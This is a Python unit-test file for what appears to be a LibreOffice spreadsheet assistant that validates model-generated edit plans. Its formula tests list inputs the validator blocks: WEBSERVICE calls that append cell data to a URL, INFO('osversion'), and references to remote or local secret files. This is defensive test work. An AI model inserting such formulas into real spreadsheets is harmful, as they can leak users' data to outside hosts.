import json
import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "python", "pythonpath"))
sys.path.insert(0, os.path.join(HERE, ".."))

from ciu_lo.core import plan as P, prompts, context
from ciu_lo.core.ciu_client import CIUClient
import mock_ciu


def plan_text(*ops, summary="s"):
    return json.dumps({"summary": summary, "operations": list(ops)})


class Addresses(unittest.TestCase):
    def test_cells_and_ranges(self):
        self.assertEqual(P.parse_range("A1"), (0, 0, 0, 0))
        self.assertEqual(P.parse_range("$B$3"), (1, 2, 1, 2))
        self.assertEqual(P.parse_range("f20:f2"), (5, 1, 5, 19))
        self.assertEqual(P.parse_range("AA10:AB11"), (26, 9, 27, 10))

    def test_rejects(self):
        for bad in ("", "A", "1A", "A0", "Sheet1.A1", "Sales!B2", "A1:B2:C3", "ZZZZ1", "XFE1", "A1048577"):
            with self.assertRaises(P.PlanError, msg=bad):
                P.parse_range(bad)


class Formulas(unittest.TestCase):
    def test_commas_become_semicolons_outside_strings(self):
        self.assertEqual(P.normalize_formula('=IF(A1>0,"a,b",SUM(B1,C1))'),
                         '=IF(A1>0;"a,b";SUM(B1;C1))')

    def test_inline_array_commas_untouched(self):
        self.assertEqual(P.normalize_formula("=SUM({1,2},A1)"), "=SUM({1,2};A1)")

    def test_adds_equals(self):
        self.assertEqual(P.normalize_formula(" SUM(A1:A3) "), "=SUM(A1:A3)")

    def test_unbalanced_rejected(self):
        for bad in ("=SUM(A1:A3", "=SUM(A1))", '="abc', "=SUM({1;2)"):
            with self.assertRaises(P.PlanError, msg=bad):
                P.normalize_formula(bad)

    def test_denied_functions(self):
        for bad in ('=WEBSERVICE("http://x/?"&A1)', "=webservice(A1)", '=FILTERXML(A1,"//x")',
                    '=HYPERLINK("http://x")', '=INFO("osversion")', "=A1+WEBSERVICE (B1)"):
            with self.assertRaises(P.PlanError, msg=bad):
                P.normalize_formula(bad)

    def test_external_locations_blocked(self):
        for bad in ("='http://x/leak.ods'#$Sheet1.A1",
                    "=SUM('https://x/a.ods'#$Sheet1.A1:A3)",
                    "='file:///Users/k/secret.ods'#$Sheet1.A1",
                    "='/Users/k/secret.ods' # $Sheet1.A1",
                    '=INDIRECT("A"&B1)',
                    '=indirect(A1)',
                    '=A1&"http://x/?"',
                    '="see www.example.com"',
                    '="\\\\server\\share"',
                    '=LEN("ftp://x")'):
            with self.assertRaises(P.PlanError, msg=bad):
                P.normalize_formula(bad)

    def test_sheet_references_still_allowed(self):
        for ok in ("=Sheet2.A1+1", "=$'Sales 2024'.B2*2", "=SUM($Sheet1.A1:A9)",
                   '=IF(A1="#";1;0)', "=COUNTIF(A1:A9;\"#N/A\")", "=OFFSET(A1;1;0)"):
            P.normalize_formula(ok)

    def test_denied_name_inside_string_is_fine(self):
        self.assertEqual(P.normalize_formula('=IF(A1="WEBSERVICE(";1;0)'), '=IF(A1="WEBSERVICE(";1;0)')

    def test_similar_names_allowed(self):
        P.normalize_formula("=MYINFO(A1)")
        P.normalize_formula("=COUNTIF(A1:A9;\">0\")")


class Parsing(unittest.TestCase):
    def test_good_plan(self):
        text = "Sure! ```json\n" + plan_text(
            {"tool": "set_values", "target": "D1", "values": [["Total"]]},
            {"tool": "fill_formula", "target": "D2:D9", "formula": "=B2*C2"},
            summary="Add total") + "\n```"
        p = P.parse_plan(text, sheet="Sales")
        self.assertEqual(p.sheet, "Sales")
        self.assertEqual(p.n_cells, 9)
        self.assertIn("D2: =B2*C2, filled across D2:D9 (8 cells)", p.describe())

    def test_extract_handles_braces_in_strings(self):
        text = plan_text({"tool": "set_formula", "target": "A1", "formula": '="}{"'})
        self.assertEqual(P.parse_plan(text).operations[0].formula, '="}{"')

    def test_errors(self):
        cases = [
            ("no json here", "did not return"),
            ('{"summary": "x", "operations": [', "cut off"),
            (plan_text({"tool": "delete_sheet", "target": "A1"}), "unknown tool"),
            (plan_text({"tool": "set_formula", "target": "A1:A2", "formula": "=1"}), "one cell"),
            (plan_text({"tool": "fill_formula", "target": "A1:B5", "formula": "=1"}), "single row or column"),
            (plan_text({"tool": "fill_formula", "target": "A1", "formula": "=1"}), "at least two"),
            (plan_text({"tool": "set_values", "target": "A1:B2", "values": [[1, 2]]}), "2x2"),
            (plan_text({"tool": "set_values", "target": "A1", "values": [["=SUM(B1)"]]}), "not set_values"),
            (plan_text({"tool": "set_values", "target": "A1", "values": [[True]]}), "text or numbers"),
            (plan_text({"tool": "set_formula", "target": "A1", "formula": "=1"},
                       {"tool": "fill_formula", "target": "A1:A3", "formula": "=2"}), "same cells"),
            (plan_text(*[{"tool": "set_formula", "target": "A%d" % i, "formula": "=1"} for i in range(1, 9)]),
             "too many"),
            (plan_text({"tool": "fill_formula", "target": "A1:A9000", "formula": "=1"}), "max 5000"),
        ]
        for text, expect in cases:
            with self.assertRaises(P.PlanError, msg=expect) as cm:
                P.parse_plan(text)
            self.assertIn(expect, str(cm.exception))

    def test_empty_plan_allowed(self):
        p = P.parse_plan(plan_text(summary="Charts are not supported yet."))
        self.assertEqual(p.operations, [])


class ActionPrompt(unittest.TestCase):
    def test_fits_window(self):
        rows = [["H%d" % c for c in range(6)]] + [[float(r * c) for c in range(6)] for r in range(2000)]
        snap = context.Snapshot("d", "S", 0, 0, rows, hints=["First empty column to the right: G"])
        for n_ctx in (2048, 4096, 8192):
            msgs, max_tokens = prompts.build_action_messages(snap, "add a total column", n_ctx)
            chars = sum(len(m["content"]) for m in msgs)
            self.assertLess(chars / prompts.CHARS_PER_TOKEN + max_tokens, n_ctx)
            self.assertIn("First empty column to the right: G", msgs[1]["content"])

    def test_example_in_prompt_is_itself_a_valid_plan(self):
        example = prompts.ACTION_SYSTEM.split("Request: total of price times quantity per row.\n")[1]
        P.parse_plan(example)


class ClientJson(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = mock_ciu.start()
        cls.client = CIUClient("http://127.0.0.1:%d" % cls.srv.server_address[1])

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def setUp(self):
        mock_ciu.STATE.__init__()

    def test_schema_sent_and_content_returned(self):
        mock_ciu.STATE.plan_reply = '<think>hm</think>{"summary": "x", "operations": []}'
        out = self.client.chat_json([{"role": "user", "content": "q"}], P.PLAN_SCHEMA)
        self.assertEqual(out, '{"summary": "x", "operations": []}')
        rf = mock_ciu.STATE.last_request["response_format"]
        self.assertEqual(rf["json_schema"]["schema"], P.PLAN_SCHEMA)

    def test_falls_back_without_response_format(self):
        mock_ciu.STATE.reject_response_format = True
        self.client.chat_json([{"role": "user", "content": "q"}], P.PLAN_SCHEMA)
        self.assertEqual(len(mock_ciu.STATE.requests), 2)
        self.assertNotIn("response_format", mock_ciu.STATE.requests[1])


if __name__ == "__main__":
    unittest.main()
